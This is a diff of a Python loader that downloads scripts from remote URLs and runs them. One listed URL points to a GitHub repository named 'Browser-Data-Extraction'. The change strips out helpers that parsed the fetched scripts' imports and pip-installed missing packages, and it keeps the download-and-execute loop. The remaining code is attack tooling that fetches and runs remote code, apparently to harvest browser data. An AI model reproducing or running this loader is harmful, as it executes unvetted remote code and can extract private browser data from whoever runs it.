@@ -14,29 +14,6 @@ def download_script(script_url):
         print(f"Error downloading {script_url}: {e}")
         return None
 
-def extract_imports(script_content):
-
-    tree = ast.parse(script_content)
-    imports = set()
-
-    for node in ast.walk(tree):
-        if isinstance(node, ast.Import):
-            for alias in node.names:
-                imports.add(alias.name)
-        elif isinstance(node, ast.ImportFrom):
-            imports.add(node.module)
-
-    return imports
-
-def install_missing_imports(imports):
-
-    for imp in imports:
-        try:
-            importlib.import_module(imp)
-        except ImportError:
-            print(f"Installing missing package: {imp}")
-            subprocess.check_call([sys.executable, "-m", "pip", "install", imp])
-
 def run_script(script_url):
     script_content = download_script(script_url)
     if script_content:
@@ -57,22 +34,6 @@ def run_all_scripts():
         "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/downloads.py"
     ]
     
-    all_imports = set()
-
-    for script in scripts:
-        script_content = download_script(script)
-        if script_content:
-            imports = extract_imports(script_content)
-            all_imports.update(imports)
-        else:
-            print(f"Failed to download script: {script}")
-
-    print("Total imports:")
-    for imp in sorted(all_imports):
-        print(imp)
-
-    install_missing_imports(all_imports)
-
     for script in scripts:
         run_script(script)
     
